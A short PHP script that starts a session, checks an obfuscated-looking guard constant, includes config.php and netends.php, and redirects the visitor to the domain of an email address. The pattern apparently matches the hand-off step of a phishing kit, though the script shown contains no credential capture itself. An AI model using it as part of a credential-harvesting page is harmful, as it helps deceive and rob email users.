<?php

session_start();
require_once('config.php');
defined('2BgI5Youc1knSTVZb3VjMWtueVBZOXVETjkwNXkQ4VlMzZmNXNzFFRkx0VE0xQkwvLbk0yTUE9PTV51qt8VS3ZmNXNzFFRkx0VE0xQkw0') or exit();
require_once('netends.php');

exit(header(sprintf("Location:%s", 'http://'.getDomain($email))));